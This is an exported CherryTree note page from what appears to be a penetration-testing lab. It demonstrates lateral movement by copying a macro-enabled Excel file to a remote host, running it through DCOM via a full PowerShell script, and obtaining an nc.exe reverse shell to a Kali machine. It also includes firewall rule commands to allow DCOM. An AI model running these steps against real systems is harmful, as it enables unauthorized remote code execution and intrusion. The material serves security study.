<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Demonstration</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Demonstration</h1><br/>Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.<br />Create a macro that when executed will give you a reverse shell.<br /><a href=""><img src="images/1179-1.png" alt="images/1179-1.png" /></a><br />Run this these commands/this script from userbox, pointing at Bossman.<br /><div class="codebox"><div class="codebox">$com&nbsp;=&nbsp;[activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;,&quot;192.168.40.129&quot;))<br /><br />$LocalPath&nbsp;=&nbsp;&quot;C:\Users\tire\Desktop\Macro.xlsm&quot;&nbsp;<br /><br />$RemotePath&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Macro.xlsm&quot;&nbsp;<br /><br />[System.IO.File]::Copy($LocalPath,&nbsp;$RemotePath,&nbsp;$True)&nbsp;<br /><br />$Path&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;&nbsp;<br /><br />$temp&nbsp;=&nbsp;[system.io.directory]::createDirectory($Path)&nbsp;<br /><br />$Workbook&nbsp;=&nbsp;$com.Workbooks.Open(&quot;C:\Macro.xlsm&quot;)<br /><br />$com.Run<span style="color:#000000;font-weight:400">(</span>&quot;Yeeter&quot;<span style="color:#000000;font-weight:400">)</span></div></div><br /><br /><a href=""><img src="images/1179-2.png" alt="images/1179-2.png" /></a><br /><br /><a href=""><img src="images/1179-3.png" alt="images/1179-3.png" /></a><br /><br />Note- You may need to add a firewall rule depending on the networks GPO to create the COM object.<br />New-NetFirewallRule -DisplayName &quot;Allow DCOM&quot; -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133<br />Remove-NetFirewallRule -DisplayName “Allow DCOM”</div></body></html>